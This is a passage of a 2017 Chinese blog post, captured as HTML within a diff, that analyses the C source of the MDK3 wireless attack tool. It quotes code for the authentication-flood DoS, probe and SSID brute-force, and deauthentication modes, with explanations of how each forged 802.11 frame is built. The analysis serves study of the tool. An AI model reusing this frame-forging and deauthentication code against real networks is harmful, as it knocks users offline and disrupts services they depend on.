class="string">'A'</span>:  <span class="comment">// Auth DoS mode with target MAC given</span></div><div class="line">    frm = create_auth_frame(ap, random_mac, <span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
+<p>这里就是验证DOS模式的主逻辑了，<code>get_target_ap()</code>获取目标， <code>create_auth_frame()</code>生成验证数据包,我们先看<code>get_target_ap()</code>函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="function">uchar *<span class="title">get_target_ap</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">// Sniffing for beacon frames to find target APs</span></div><div class="line"><span class="comment">// Tries to to find NEW AP when called, saves already reported APs in aps_known[] array</span></div><div class="line"><span class="comment">// If it cannot find a new AP within 100 frames it either choses a random known AP</span></div><div class="line"><span class="comment">// or if no APs were ever found it keeps sniffing.</span></div><div class="line"></div><div class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> t, u, known;</div><div class="line">    uchar rnd;</div><div class="line"></div><div class="line">    keep_waiting: <span class="comment">// When nothing ever found this is called after the sniffing loop</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> (t=<span class="number">0</span>; t&lt;<span class="number">100</span>; t++)</div><div class="line">    &#123;</div><div class="line">	len = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span> (len &lt; <span class="number">22</span>)</div><div class="line">	    len = read_packet(pkt_sniff, <span class="number">4096</span>);</div><div class="line">	known = <span class="number">0</span>;   <span class="comment">// Clear known flag</span></div><div class="line">	<span class="keyword">if</span> (! <span class="built_in">memcmp</span>(pkt_sniff, <span class="string">"\x80"</span>, <span class="number">1</span>)) &#123;   <span class="comment">//Filter: let only Beacon frames through</span></div><div class="line">	    <span class="keyword">for</span> (u=<span class="number">0</span>; u&lt;aps_known_count; u++)</div><div class="line">	    &#123;</div><div class="line">		<span class="keyword">if</span> (! <span class="built_in">memcmp</span>(aps_known[u], pkt_sniff+<span class="number">16</span>, <span class="number">6</span>)) &#123; </div><div class="line">		    known = <span class="number">1</span>; </div><div class="line">		    <span class="keyword">break</span>;</div><div class="line">		&#125;   <span class="comment">// AP known =&gt; Set known flag</span></div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! known)  <span class="comment">// AP is NEW, copy MAC to array and return it</span></div><div class="line">	    &#123;</div><div class="line">		<span class="built_in">memcpy</span>(aps_known[aps_known_count], pkt_sniff+<span class="number">16</span>, ETH_MAC_LEN);</div><div class="line">		aps_known_count++;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>) aps_known_count &gt;=</div><div class="line">			<span class="keyword">sizeof</span> (aps_known) / <span class="keyword">sizeof</span> (aps_known[<span class="number">0</span>]) ) &#123;</div><div class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"exceeded max aps_known\n"</span>);</div><div class="line">			<span class="built_in">exit</span> (<span class="number">1</span>);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">return</span> pkt_sniff+<span class="number">16</span>;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// No new target found within 100 packets</span></div><div class="line">    <span class="comment">// If there are no beacons at all, wait for some to appear</span></div><div class="line">    <span class="keyword">if</span> (aps_known_count == <span class="number">0</span>)</div><div class="line">	<span class="keyword">goto</span> keep_waiting;</div><div class="line"></div><div class="line">    <span class="comment">// Pick random known AP to try once more</span></div><div class="line">    rnd = random() % aps_known_count;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> (uchar *) aps_known[rnd];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里可以发现，程序将读取数据包的第一个字节与<code>\x80</code>进行比较，可以发现这个位置的数据是用来标记数据包是否为信号数据包，<br>这里就是不断的读取数据寻找AP，其中<code>read_packet()</code>是来自osdep的一个API，mdk3和aircrack都是基于它开发的<br>这里是不断寻找新的AP，找到了就和已知的AP进行比对，如果已经存在就跳过，直到寻找到新的AP为止<br>现在来看一下<code>create_auth_frame()</code>函数，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function">struct pckt <span class="title">create_auth_frame</span><span class="params">(uchar *ap, <span class="keyword">int</span> random_mac, uchar *client_mac)</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">// Generating an authentication frame</span></div><div class="line"></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pckt</span> <span class="title">retn</span>;</span></div><div class="line">    <span class="keyword">char</span> *hdr = <span class="string">"\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span></div><div class="line">		<span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"</span>;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pckt</span> <span class="title">mac</span>;</span></div><div class="line"></div><div class="line">    <span class="built_in">memcpy</span>(pkt, hdr, <span class="number">31</span>);</div><div class="line">    <span class="comment">// Set target AP</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">4</span>, ap, ETH_MAC_LEN);</div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">16</span>,ap, ETH_MAC_LEN);</div><div class="line">    <span class="comment">// Set client MAC</span></div><div class="line">    <span class="keyword">if</span> (client_mac == <span class="literal">NULL</span>) &#123;</div><div class="line">	<span class="keyword">if</span> (random_mac) mac = generate_mac(<span class="number">0</span>);</div><div class="line">	    <span class="keyword">else</span> mac = generate_mac(<span class="number">1</span>);</div><div class="line">	<span class="built_in">memcpy</span>(pkt+<span class="number">10</span>,mac.data,ETH_MAC_LEN);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="built_in">memcpy</span>(pkt+<span class="number">10</span>,client_mac,ETH_MAC_LEN);</div><div class="line">    &#125;</div><div class="line">    retn.len = <span class="number">30</span>;</div><div class="line">    retn.data = pkt;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> retn;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里其实就是简单的根据参数设置数据包的内容，和之前的beacon模式大同小异，最终生成的数据包会返回到<code>parser()</code>函数进行发包操作  </p>
+<h2 id="探测AP及ESSID爆破"><a href="#探测AP及ESSID爆破" class="headerlink" title="探测AP及ESSID爆破"></a>探测AP及ESSID爆破</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'p'</span>:</div><div class="line">    mac = generate_mac(<span class="number">1</span>);</div><div class="line">    frm = create_probe_frame(ssid, mac);</div><div class="line">    <span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> <span class="string">'P'</span>:</div><div class="line">    <span class="keyword">if</span> (real_brute) &#123;</div><div class="line">    frm = ssid_brute_real();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    frm = ssid_brute();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
+<p>这里出现了两个分支，和上个模式一样根据参数决定，先看小写p代表的模式<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function">struct pckt <span class="title">create_probe_frame</span><span class="params">(<span class="keyword">char</span> *ssid, struct pckt mac)</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">// Generating Probe Frame</span></div><div class="line"></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pckt</span> <span class="title">retn</span>;</span></div><div class="line">    <span class="keyword">char</span> *hdr = <span class="string">"\x40\x00\x00\x00\xff\xff\xff\xff\xff\xff"</span>;</div><div class="line">    <span class="keyword">char</span> *bcast = <span class="string">"\xff\xff\xff\xff\xff\xff"</span>;</div><div class="line">    <span class="keyword">char</span> *seq = <span class="string">"\x00\x00\x00"</span>;</div><div class="line">    <span class="keyword">char</span> *rates = <span class="string">"\x01\x04\x82\x84\x8b\x96"</span>;</div><div class="line">    <span class="keyword">int</span> slen;</div><div class="line"></div><div class="line">    slen = <span class="built_in">strlen</span>(ssid);</div><div class="line"></div><div class="line">    <span class="built_in">memcpy</span>(pkt, hdr, <span class="number">10</span>);</div><div class="line">    <span class="comment">// MAC which is probing</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">10</span>, mac.data, ETH_MAC_LEN);</div><div class="line">    <span class="comment">// Destination: Broadcast</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">16</span>, bcast, ETH_MAC_LEN);</div><div class="line">    <span class="comment">// Sequence</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">22</span>, seq, <span class="number">3</span>);</div><div class="line">    <span class="comment">// SSID</span></div><div class="line">    pkt[<span class="number">25</span>] = slen;</div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">26</span>, ssid, slen);</div><div class="line">    <span class="comment">// Supported Bitrates (1, 2, 5.5, 11 MBit)</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">26</span>+slen, rates, ETH_MAC_LEN);</div><div class="line"></div><div class="line">    retn.data = pkt;</div><div class="line">    retn.len = <span class="number">26</span> + slen + ETH_MAC_LEN;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> retn;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>同样的，这里设置了要发送的数据包内容，mac地址随机生成，需要探测的SSID则由用户给出<br>现在来看大写P的模式，另一个模式用于爆破可能存在的SSID,现在看看对应函数<code>ssid_brute_real()</code>的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (state == <span class="number">0</span>) &#123;</div><div class="line"><span class="comment">//state0</span></div><div class="line"><span class="comment">//- SPAWN Sniffer thread</span></div><div class="line">	pthread_create( &amp;sniffer, <span class="literal">NULL</span>, (<span class="keyword">void</span> *) ssid_brute_sniffer, (<span class="keyword">void</span> *) <span class="number">1</span>);</div><div class="line"><span class="comment">//- sniff beacon frame from target / do nothin if target==NULL</span></div><div class="line">	<span class="keyword">if</span> (target != <span class="literal">NULL</span>) &#123;</div><div class="line">	    pkt = get_target_ssid();</div><div class="line"><span class="comment">//- set lenght variable</span></div><div class="line">	    ssid_len = pkt.len;</div><div class="line"></div><div class="line">	    <span class="keyword">if</span> ((ssid_len == <span class="number">1</span>) || (ssid_len == <span class="number">0</span>)) &#123;</div><div class="line">		ssid_len = <span class="number">1</span>;    <span class="comment">//Compensate 0 and 1-byte placeholder SSIDs as maximum len</span></div><div class="line">		unknown_len = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line"><span class="comment">//- set state1</span></div><div class="line">	    state = <span class="number">1</span>;</div><div class="line"><span class="comment">//-&gt; return probe packet using the SSID supplied by beacon frame</span></div><div class="line">	    <span class="keyword">return</span> create_probe_frame((<span class="keyword">char</span> *)pkt.data, generate_mac(<span class="number">1</span>));</div><div class="line">	&#125;</div><div class="line"><span class="comment">//- In untargetted mode, continue</span></div><div class="line">	state = <span class="number">1</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>这里先是开启了新的线程，调用<code>ssid_brute_sniffer()</code>函数探测可能存在的SSID<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">void ssid_brute_sniffer()</div><div class="line">&#123;</div><div class="line">    printf("Sniffer thread started\n");</div><div class="line">    int len=0;</div><div class="line">    int i;</div><div class="line">    int no_disp;</div><div class="line">//infinite loop</div><div class="line">    while (1) &#123;</div><div class="line">//sniff packet</div><div class="line">	len = read_packet(pkt_check, MAX_PACKET_LENGTH);</div><div class="line">//is probe response?</div><div class="line">	if (! memcmp(pkt_check, "\x50", 1)) &#123;</div><div class="line">//parse + print response</div><div class="line">	    uchar *mac = pkt_check+16;</div><div class="line">	    uchar slen = pkt_check[37];</div><div class="line">	    pkt_check[38+slen] = '\x00';</div><div class="line">	    no_disp = 0;</div><div class="line">	    for (i=0; i&lt;aps_known_count; i++) &#123;</div><div class="line">		if (!memcmp(aps_known[i], mac, ETH_MAC_LEN)) no_disp = 1;</div><div class="line">	    &#125;</div><div class="line">	    if (!exit_now &amp;&amp; !no_disp) &#123;</div><div class="line">		printf("\nGot response from %02X:%02X:%02X:%02X:%02X:%02X, SSID: \"%s\"\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], pkt_check+38);</div><div class="line">		printf("Last try was: %s\n", brute_ssid);</div><div class="line">	    &#125;</div><div class="line">	    if (!no_disp) &#123;</div><div class="line">		memcpy(aps_known[aps_known_count], mac, ETH_MAC_LEN);</div><div class="line">		aps_known_count++;</div><div class="line">		if ((unsigned int) aps_known_count &gt;=</div><div class="line">			sizeof (aps_known) / sizeof (aps_known[0]) ) &#123;</div><div class="line">			fprintf(stderr, "exceeded max aps_known\n");</div><div class="line">			exit (1);</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">//If response is from target, exit mdk3</div><div class="line">	    if (target != NULL) &#123; </div><div class="line">		if (!memcmp(pkt_check+16, target, ETH_MAC_LEN)) &#123;</div><div class="line">		    exit_now = 1;</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">//loop</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>对应函数<code>ssid_brute_real()</code>的另一部分<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (state == <span class="number">1</span>) &#123;</div><div class="line"><span class="comment">//state1</span></div><div class="line"><span class="comment">//- get SSID to probe for</span></div><div class="line">	bruteforce_ssid();</div><div class="line">	ssid = brute_ssid;</div><div class="line"><span class="comment">//- Stop work if last SSID is generated and sent</span></div><div class="line">	<span class="keyword">if</span> (end) &#123;</div><div class="line">	    <span class="keyword">if</span> (unknown_len) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"\nAll %d possible SSIDs with length %d sent, trying length %d.\n"</span>, turns<span class="number">-1</span>, ssid_len, ssid_len+<span class="number">1</span>);</div><div class="line">		end = <span class="number">0</span>; turns = <span class="number">0</span>; <span class="comment">//Resetting bruteforce counters, trying one byte more</span></div><div class="line">		<span class="built_in">memset</span>(brute_ssid, <span class="number">0</span>, (<span class="number">256</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>)));</div><div class="line">		ssid_len++;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">if</span> (max_permutations) <span class="built_in">printf</span>(<span class="string">"\nall %d possible SSIDs sent.\n"</span>, turns<span class="number">-1</span>);</div><div class="line">		<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"\nall %d possible SSIDs sent.\n"</span>, max_permutations);</div><div class="line">		exit_now = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line"><span class="comment">//-&gt; return packet containing SSID</span></div><div class="line">	<span class="keyword">return</span> create_probe_frame(ssid, generate_mac(<span class="number">1</span>));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> pkt;</div></pre></td></tr></table></figure></p>
+<p>这里则是爆破生成SSID进行探测，还有另外一个<code>ssid_brute()</code>函数则是从文件中读取要爆破的SSID  </p>
+<h2 id="强制断开验证"><a href="#强制断开验证" class="headerlink" title="强制断开验证"></a>强制断开验证</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</div><div class="line">    frm = amok_machine(list_file);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
+<p>这个模式下会不断的发送断开验证的数据包，强制瘫痪掉一部分无线网络<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</div><div class="line">	mode = <span class="string">'d'</span>;</div><div class="line">	<span class="keyword">for</span> (t=<span class="number">3</span>; t&lt;argc; t++)</div><div class="line">	&#123;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-s"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		pps = strtol(argv[t+<span class="number">1</span>], (<span class="keyword">char</span> **) <span class="literal">NULL</span>, <span class="number">10</span>);</div><div class="line">		usespeed = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-w"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (wblist != <span class="number">0</span>) &#123; <span class="built_in">printf</span>(use_deau); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">		load_whitelist(argv[t+<span class="number">1</span>]);</div><div class="line">		list_file = argv[t+<span class="number">1</span>];</div><div class="line">		wblist = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-b"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (wblist != <span class="number">0</span>) &#123; <span class="built_in">printf</span>(use_deau); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">		load_whitelist(argv[t+<span class="number">1</span>]);</div><div class="line">		list_file = argv[t+<span class="number">1</span>];</div><div class="line">		wblist = <span class="number">2</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-c"</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		    <span class="comment">// There is a channel list given</span></div><div class="line">		    init_channel_hopper(argv[t+<span class="number">1</span>], <span class="number">3</span>);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">		    <span class="comment">// No list given</span></div><div class="line">		    init_channel_hopper(<span class="literal">NULL</span>, <span class="number">3</span>);</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>这里可以看出这个模式支持白名单,指定发包速率和指定信道<br>现在我们看看所使用的<code>amok_machine()</code>函数<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">case 0:</div><div class="line">	    newone:</div><div class="line"></div><div class="line">	    if (wblist) &#123;			//Periodically re-read list every LIST_REREAD_PERIOD sec.</div><div class="line">		if (t_prev == 0) &#123;</div><div class="line">		    printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);</div><div class="line">		&#125;</div><div class="line">		if (time(NULL) - t_prev &gt;= LIST_REREAD_PERIOD) &#123;</div><div class="line">		    t_prev = time( NULL );</div><div class="line">		    load_whitelist(filename);</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line"></div><div class="line">	    pkt_amok = get_target_deauth();</div><div class="line">	    if ((pkt_amok[1] &amp; '\x01') &amp;&amp; (pkt_amok[1] &amp; '\x02')) &#123;	// WDS packet</div><div class="line">		mac_sa = pkt_amok + 4;</div><div class="line">		mac_ta = pkt_amok + 10;</div><div class="line">		wds = 1;</div><div class="line">	    &#125;</div><div class="line">	    else if (pkt_amok[1] &amp; '\x01') &#123;		// ToDS packet</div><div class="line">		mac_ta = pkt_amok + 4;</div><div class="line">		mac_sa = pkt_amok + 10;</div><div class="line">		wds = 0;</div><div class="line">	    &#125;</div><div class="line">	    else if (pkt_amok[1] &amp; '\x02') &#123;		// FromDS packet</div><div class="line">		mac_sa = pkt_amok + 4;</div><div class="line">		mac_ta = pkt_amok + 10;</div><div class="line">		wds = 0;</div><div class="line">	    &#125;</div><div class="line">	    else if ((!(pkt_amok[1] &amp; '\x01')) &amp;&amp; (!(pkt_amok[1] &amp; '\x02'))) &#123;	//AdHoc packet</div><div class="line">		mac_sa = pkt_amok + 10;</div><div class="line">		mac_ta = pkt_amok + 16;</div><div class="line">		wds = 0;</div><div class="line">	    &#125;</div><div class="line">	    else &#123;</div><div class="line">		goto newone;</div><div class="line">	    &#125;</div><div class="line"></div><div class="line">	    if (wblist == 2) &#123;			//Using Blacklist mode - Skip if neither Client nor AP is in list</div><div class="line">		if (!(is_whitelisted(mac_ta)) &amp;&amp; !((is_whitelisted(mac_sa))))</div><div class="line">		    goto newone;</div><div class="line">	    &#125;</div><div class="line">            if (wblist == 1) &#123;			//Using Whitelist mode - Skip if Client or AP is in list</div><div class="line">		if (is_whitelisted(mac_ta)) goto newone;</div><div class="line">		if (is_whitelisted(mac_sa)) goto newone;</div><div class="line">	    &#125;</div><div class="line"></div><div class="line">	    state = 1;</div><div class="line">	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 1);</div></pre></td></tr></table></figure></p>
+<p>这里指代的是默认的case，主要是根据黑白名单过滤掉相应的mac地址，然后再设置数据包内容，其他case大同小异，细节不同而已  </p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>MDK3其实还有其他很多有趣的功能，也有很多值得我们去分析，整个MDK3.c大概4K行，我可能看了大概不到一半，还是有很多东西值得我们去深究的  </p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/05/31/MDK3源码分析/">MDK3源码分析</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">DazzleP</a></p>
+        <p><span>发布时间:</span>2017-05-31, 23:44:08</p>
+        <p><span>最后更新:</span>2017-05-31, 23:45:00</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/05/31/MDK3源码分析/" title="MDK3源码分析">http://yoursite.com/2017/05/31/MDK3源码分析/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/05/31/MDK3源码分析/　　作者: DazzleP" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/05/05/BCTF-2017-babyuse/">
+                    BCTF 2017 babyuse
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-函数分析"><span class="toc-number">2.</span> <span class="toc-text">main()函数分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beacon模式"><span class="toc-number">3.</span> <span class="toc-text">Beacon模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#验证DOS攻击模式"><span class="toc-number">4.</span> <span class="toc-text">验证DOS攻击模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#探测AP及ESSID爆破"><span class="toc-number">5.</span> <span class="toc-text">探测AP及ESSID爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#强制断开验证"><span class="toc-number">6.</span> <span class="toc-text">强制断开验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
